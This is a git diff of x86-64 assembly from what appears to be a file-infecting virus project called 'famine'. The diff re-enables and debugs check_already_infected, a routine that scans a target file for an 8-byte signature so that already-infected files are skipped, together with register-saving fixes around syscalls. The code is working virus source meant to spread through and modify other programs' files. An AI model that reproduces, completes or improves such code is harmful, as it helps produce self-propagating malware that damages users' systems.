@@ -118,7 +118,7 @@ famine_file:
 
 	call open_file
 	mov [rsp], rax;stock fd
-;	call check_already_infected ; int check_already_infected(int fd)
+	call check_already_infected ; int check_already_infected(int fd)
 
 	mov rax, 3 ; close syscall n.
 	mov rdi, [rsp] ; close(fd)
@@ -145,10 +145,15 @@ retn
 
 ;we're gonna check if file already contains the signature
 check_already_infected:
-	push rdi
-	push rsi
+	push rbx
 	push rcx
+	push r8
+	push r9
+	push r10
+	push rsi
 	push rdx
+	push rdi
+
 
 	call open_file
 	mov rdi, rax; store fd in rdi
@@ -157,14 +162,16 @@ check_already_infected:
 	push rcx
 	xor rcx, rcx
 	loop_cai:
-		lea rsi, [rsp + 9]
+		lea rsi, [rsp + 8]
 		mov rdx, 1; read one byte at the time
 		mov rax, 0
+		push rcx ; save rcx coz fcking syscall will modify it
 		syscall; read(rdi, rsi, rdx);
+		pop rcx
 		cmp rax, 0
 		je end_of_cai
 		mov dl, [rsp + rcx]
-		cmp byte[rsp + 9], dl
+		cmp byte[rsp + 8], dl
 		jne reset_rcx_cai
 		inc rcx
 		cmp rcx, 8 ;sel-melc 8 bytes long
@@ -185,8 +192,13 @@ check_already_infected:
 		syscall
 		pop rax;restore return val
 	
-	pop rdx
-	pop rcx
-	pop rsi
 	pop rdi
+	pop rdx
+	pop rsi
+	pop r10
+	pop r9
+	pop r8
+	pop rcx
+	pop rbx
+
 retn
